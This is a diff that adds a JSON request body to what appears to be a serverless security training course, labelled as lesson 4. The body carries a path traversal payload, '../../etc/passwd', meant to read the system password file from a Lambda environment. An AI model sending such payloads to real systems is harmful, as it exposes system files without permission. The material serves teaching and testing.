@@ -1,0 +1,7 @@
+{
+  "_comment": "Lesson 4 - Path traversal payload. The 'file' value escapes /tmp/ using ../ sequences to read /etc/passwd from the Lambda execution environment.",
+  "body": {
+    "userId": "YOUR_ADMIN_USER_ID_HERE",
+    "file": "../../etc/passwd"
+  }
+}
